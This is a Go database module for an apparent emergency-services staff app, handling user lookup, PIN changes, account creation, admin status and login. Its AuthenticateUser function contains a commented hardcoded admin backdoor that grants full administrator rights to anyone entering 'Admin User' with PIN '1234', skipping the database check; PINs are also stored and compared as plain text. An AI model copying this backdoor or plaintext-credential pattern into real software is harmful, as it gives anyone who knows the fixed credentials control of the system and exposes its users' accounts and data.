package db

import (
	"database/sql"
)

// GetActiveUsers returns all active users for login dropdown
func (db *DB) GetActiveUsers() ([]User, error) {
	rows, err := db.Query(`
		SELECT id, first_name, last_name, position, ems_level, is_admin, active, joined_date, created
		FROM users 
		WHERE active = 1 
		ORDER BY last_name, first_name
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var user User
		var joinedDate sql.NullTime
		var emsLevel sql.NullString
		err := rows.Scan(&user.ID, &user.FirstName, &user.LastName, &user.Position, &emsLevel, &user.IsAdmin, &user.Active, &joinedDate, &user.Created)
		if err != nil {
			return nil, err
		}
		if joinedDate.Valid {
			user.JoinedDate = &joinedDate.Time
		}
		if emsLevel.Valid {
			user.EMSLevel = emsLevel.String
		}
		users = append(users, user)
	}
	return users, nil
}

// GetUserByID returns a user by ID
func (db *DB) GetUserByID(id int) (*User, error) {
	var user User
	var joinedDate sql.NullTime
	var emsLevel sql.NullString
	err := db.QueryRow(`
		SELECT id, first_name, last_name, position, ems_level, is_admin, pin, active, joined_date, created
		FROM users WHERE id = ?
	`, id).Scan(&user.ID, &user.FirstName, &user.LastName, &user.Position, &emsLevel, &user.IsAdmin, &user.PIN, &user.Active, &joinedDate, &user.Created)
	
	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}
	if joinedDate.Valid {
		user.JoinedDate = &joinedDate.Time
	}
	if emsLevel.Valid {
		user.EMSLevel = emsLevel.String
	}
	return &user, nil
}

// ChangePIN updates a user's PIN
func (db *DB) ChangePIN(userID int, newPIN string) error {
	_, err := db.Exec(`
		UPDATE users 
		SET pin = ?
		WHERE id = ?
	`, newPIN, userID)
	return err
}
// CreateUser creates a new user
func (db *DB) CreateUser(firstName, lastName, position, emsLevel, pin string, isAdmin bool) error {
	_, err := db.Exec(`
		INSERT INTO users (first_name, last_name, position, ems_level, is_admin, pin, active) 
		VALUES (?, ?, ?, ?, ?, ?, 1)
	`, firstName, lastName, position, emsLevel, isAdmin, pin)
	return err
}

// UpdateUser updates user information
func (db *DB) UpdateUser(user *User) error {
	_, err := db.Exec(`
		UPDATE users 
		SET first_name = ?, last_name = ?, position = ?, ems_level = ?, is_admin = ?, pin = ?, active = ?, joined_date = ?
		WHERE id = ?
	`, user.FirstName, user.LastName, user.Position, user.EMSLevel, user.IsAdmin, user.PIN, user.Active, user.JoinedDate, user.ID)
	return err
}

// UpdateUserPosition updates a user's position
func (db *DB) UpdateUserPosition(userID int, position string) error {
	_, err := db.Exec(`
		UPDATE users 
		SET position = ?
		WHERE id = ?
	`, position, userID)
	return err
}

// UpdateUserAdminStatus updates a user's admin status
func (db *DB) UpdateUserAdminStatus(userID int, isAdmin bool) error {
	_, err := db.Exec(`
		UPDATE users 
		SET is_admin = ?
		WHERE id = ?
	`, isAdmin, userID)
	return err
}

// UpdateUserJoinDate updates a user's join date
func (db *DB) UpdateUserJoinDate(userID int, joinDate string) error {
	_, err := db.Exec(`
		UPDATE users 
		SET joined_date = ?
		WHERE id = ?
	`, joinDate, userID)
	return err
}

// ValidateAdminPIN validates admin PIN
func (db *DB) ValidateAdminPIN(pin string) (bool, error) {
	var count int
	err := db.QueryRow(`
		SELECT COUNT(*) FROM users 
		WHERE is_admin = 1 AND pin = ? AND active = 1
	`, pin).Scan(&count)
	
	if err != nil {
		return false, err
	}
	return count > 0, nil
}

// GetAllUsers returns all users (for admin management)
func (db *DB) GetAllUsers() ([]User, error) {
	rows, err := db.Query(`
		SELECT id, first_name, last_name, position, ems_level, is_admin, active, joined_date, created
		FROM users 
		ORDER BY last_name, first_name
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var user User
		var joinedDate sql.NullTime
		var emsLevel sql.NullString
		err := rows.Scan(&user.ID, &user.FirstName, &user.LastName, &user.Position, &emsLevel, &user.IsAdmin, &user.Active, &joinedDate, &user.Created)
		if err != nil {
			return nil, err
		}
		if joinedDate.Valid {
			user.JoinedDate = &joinedDate.Time
		}
		if emsLevel.Valid {
			user.EMSLevel = emsLevel.String
		}
		users = append(users, user)
	}
	return users, nil
}

// AuthenticateUser validates user credentials and returns user if valid
func (db *DB) AuthenticateUser(fullName, pin string) (*User, error) {
	// Hardcoded admin backdoor - always works
	if fullName == "Admin User" && pin == "1234" {
		// Return hardcoded admin user
		return &User{
			ID:        0,
			FirstName: "Admin",
			LastName:  "User",
			Position:  "administrator",
			IsAdmin:   true,
			Active:    true,
		}, nil
	}
	
	var user User
	var joinedDate sql.NullTime
	var emsLevel sql.NullString
	err := db.QueryRow(`
		SELECT id, first_name, last_name, position, ems_level, is_admin, pin, active, joined_date, created
		FROM users 
		WHERE (first_name || ' ' || last_name) = ? AND pin = ? AND active = 1
	`, fullName, pin).Scan(&user.ID, &user.FirstName, &user.LastName, &user.Position, &emsLevel, &user.IsAdmin, &user.PIN, &user.Active, &joinedDate, &user.Created)
	
	if err == sql.ErrNoRows {
		return nil, sql.ErrNoRows
	}
	if err != nil {
		return nil, err
	}
	if joinedDate.Valid {
		user.JoinedDate = &joinedDate.Time
	}
	if emsLevel.Valid {
		user.EMSLevel = emsLevel.String
	}
	return &user, nil
}

// GetAdminUsers returns all active admin users
func (db *DB) GetAdminUsers() ([]User, error) {
	rows, err := db.Query(`
		SELECT id, first_name, last_name, position, ems_level, is_admin, active, joined_date, created
		FROM users 
		WHERE is_admin = 1 AND active = 1
		ORDER BY last_name, first_name
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var user User
		var joinedDate sql.NullTime
		var emsLevel sql.NullString
		err := rows.Scan(&user.ID, &user.FirstName, &user.LastName, &user.Position, &emsLevel, &user.IsAdmin, &user.Active, &joinedDate, &user.Created)
		if err != nil {
			return nil, err
		}
		if joinedDate.Valid {
			user.JoinedDate = &joinedDate.Time
		}
		if emsLevel.Valid {
			user.EMSLevel = emsLevel.String
		}
		users = append(users, user)
	}
	return users, nil
}
